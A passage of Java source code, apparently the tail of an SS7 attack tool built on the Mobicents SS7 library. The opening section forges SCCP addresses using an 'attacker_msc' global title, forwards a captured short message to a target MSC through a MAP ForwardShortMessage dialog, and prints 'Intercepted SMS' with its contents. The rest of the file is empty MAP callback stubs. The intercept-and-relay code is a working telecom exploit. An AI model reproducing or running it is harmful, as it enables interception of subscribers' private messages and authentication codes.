		GlobalTitle0100 gtTrueMsc = this.sccpProvider.getParameterFactory().createGlobalTitle(target_msc, 0,
			org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
			NatureOfAddress.INTERNATIONAL);

		GlobalTitle0100 attack_msc = this.sccpProvider.getParameterFactory().createGlobalTitle(attacker_msc, 0,
			org.mobicents.protocols.ss7.indicator.NumberingPlan.ISDN_TELEPHONY, null,
			NatureOfAddress.INTERNATIONAL);

		SccpAddress callingMSC = this.sccpStack.getSccpProvider().getParameterFactory().createSccpAddress(
			RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, attack_msc, CLIENT_SPC, SSN_MSC);

		SccpAddress calledMSC = this.sccpStack.getSccpProvider().getParameterFactory().createSccpAddress(
			RoutingIndicator.ROUTING_BASED_ON_GLOBAL_TITLE, gtTrueMsc, SERVER_SPC, SSN_MSC);

		MAPDialogSms mapDialogSms = this.mapProvider.getMAPServiceSms().createNewDialog(
			MAPApplicationContext.getInstance(MAPApplicationContextName.shortMsgMTRelayContext,
				MAPApplicationContextVersion.version2),
			callingMSC, null, calledMSC, null);
		mapDialogSms.addForwardShortMessageRequest(destination_imsi, orig_smsc, sms_data, false);

		mapDialogSms.send();
		System.out.println("\033[34m[*]\033[0mSMS Forwarded to target...");

		System.out.println("\033[32m[+]\033[0mIntercepted SMS: " + sms_data);
		System.out.println("\033[34m[*]\033[0mClosing Session...");
		Thread.sleep(10000);
		System.exit(0);

	    } else {

		System.out.println("\033[32m[+]\033[0mIntercepted SMS: " + sms_data);
		System.out.println("\033[34m[*]\033[0mClosing Session...");
		Thread.sleep(10000);
		System.exit(0);
	    }

	} catch (Exception ex) {
	    System.out.println("\033[31m[-]\033[0mError Forwarding SMS  " + ex.getMessage());
	    System.exit(16);
	}

    }

    @Override
    public void onMtForwardShortMessageRequest(MtForwardShortMessageRequest mtForwardShortMessageRequest) {

    }

    @Override
    public void onInsertSubscriberDataResponse(InsertSubscriberDataResponse insertSubscriberDataResponse) {

    }

    @Override
    public void onSendIdentificationRequest(SendIdentificationRequest sendIdentificationRequest) {

    }

    @Override
    public void onSendIdentificationResponse(SendIdentificationResponse sendIdentificationResponse) {

    }

    @Override
    public void onUpdateGprsLocationRequest(UpdateGprsLocationRequest updateGprsLocationRequest) {

    }

    @Override
    public void onUpdateGprsLocationResponse(UpdateGprsLocationResponse updateGprsLocationResponse) {

    }

    @Override
    public void onPurgeMSRequest(PurgeMSRequest purgeMSRequest) {

    }

    @Override
    public void onPurgeMSResponse(PurgeMSResponse purgeMSResponse) {

    }

    @Override
    public void onSendAuthenticationInfoRequest(SendAuthenticationInfoRequest sendAuthenticationInfoRequest) {

    }

    @Override
    public void onSendAuthenticationInfoResponse(SendAuthenticationInfoResponse sendAuthenticationInfoResponse) {

    }

    @Override
    public void onAuthenticationFailureReportRequest(
	    AuthenticationFailureReportRequest authenticationFailureReportRequest) {

    }

    @Override
    public void onAuthenticationFailureReportResponse(
	    AuthenticationFailureReportResponse authenticationFailureReportResponse) {

    }

    @Override
    public void onResetRequest(ResetRequest resetRequest) {

    }

    @Override
    public void onForwardCheckSSIndicationRequest(ForwardCheckSSIndicationRequest forwardCheckSSIndicationRequest) {

    }

    @Override
    public void onRestoreDataRequest(RestoreDataRequest restoreDataRequest) {

    }

    @Override
    public void onRestoreDataResponse(RestoreDataResponse restoreDataResponse) {

    }

    @Override
    public void onAnyTimeInterrogationRequest(AnyTimeInterrogationRequest anyTimeInterrogationRequest) {

    }

    @Override
    public void onAnyTimeInterrogationResponse(AnyTimeInterrogationResponse anyTimeInterrogationResponse) {

    }

    @Override
    public void onProvideSubscriberInfoRequest(ProvideSubscriberInfoRequest provideSubscriberInfoRequest) {

    }

    @Override
    public void onProvideSubscriberInfoResponse(ProvideSubscriberInfoResponse provideSubscriberInfoResponse) {

    }

    @Override
    public void onDeleteSubscriberDataRequest(DeleteSubscriberDataRequest deleteSubscriberDataRequest) {

    }

    @Override
    public void onDeleteSubscriberDataResponse(DeleteSubscriberDataResponse deleteSubscriberDataResponse) {

    }

    @Override
    public void onCheckImeiRequest(CheckImeiRequest checkImeiRequest) {

    }

    @Override
    public void onCheckImeiResponse(CheckImeiResponse checkImeiResponse) {

    }

    @Override
    public void onActivateTraceModeRequest_Mobility(
	    ActivateTraceModeRequest_Mobility activateTraceModeRequest_mobility) {

    }

    @Override
    public void onActivateTraceModeResponse_Mobility(
	    ActivateTraceModeResponse_Mobility activateTraceModeResponse_mobility) {

    }

    @Override
    public void onForwardShortMessageResponse(ForwardShortMessageResponse forwardShortMessageResponse) {

    }

    @Override
    public void onMoForwardShortMessageRequest(MoForwardShortMessageRequest moForwardShortMessageRequest) {

    }

    @Override
    public void onMoForwardShortMessageResponse(MoForwardShortMessageResponse moForwardShortMessageResponse) {

    }

    @Override
    public void onMtForwardShortMessageResponse(MtForwardShortMessageResponse mtForwardShortMessageResponse) {

    }

    @Override
    public void onSendRoutingInfoForSMRequest(SendRoutingInfoForSMRequest sendRoutingInfoForSMRequest) {

    }

    @Override
    public void onSendRoutingInfoForSMResponse(SendRoutingInfoForSMResponse sendRoutingInfoForSMResponse) {

    }

    @Override
    public void onReportSMDeliveryStatusRequest(ReportSMDeliveryStatusRequest reportSMDeliveryStatusRequest) {

    }

    @Override
    public void onReportSMDeliveryStatusResponse(ReportSMDeliveryStatusResponse reportSMDeliveryStatusResponse) {

    }

    @Override
    public void onInformServiceCentreRequest(InformServiceCentreRequest informServiceCentreRequest) {

    }

    @Override
    public void onAlertServiceCentreRequest(AlertServiceCentreRequest alertServiceCentreRequest) {

    }

    @Override
    public void onAlertServiceCentreResponse(AlertServiceCentreResponse alertServiceCentreResponse) {

    }

    @Override
    public void onReadyForSMRequest(ReadyForSMRequest readyForSMRequest) {

    }

    @Override
    public void onReadyForSMResponse(ReadyForSMResponse readyForSMResponse) {

    }

    @Override
    public void onNoteSubscriberPresentRequest(NoteSubscriberPresentRequest noteSubscriberPresentRequest) {

    }

    @Override
    public void onAnyTimeSubscriptionInterrogationRequest(AnyTimeSubscriptionInterrogationRequest arg0) {
	// TODO Auto-generated method stub

    }

    @Override
    public void onAnyTimeSubscriptionInterrogationResponse(AnyTimeSubscriptionInterrogationResponse arg0) {
	// TODO Auto-generated method stub

    }

}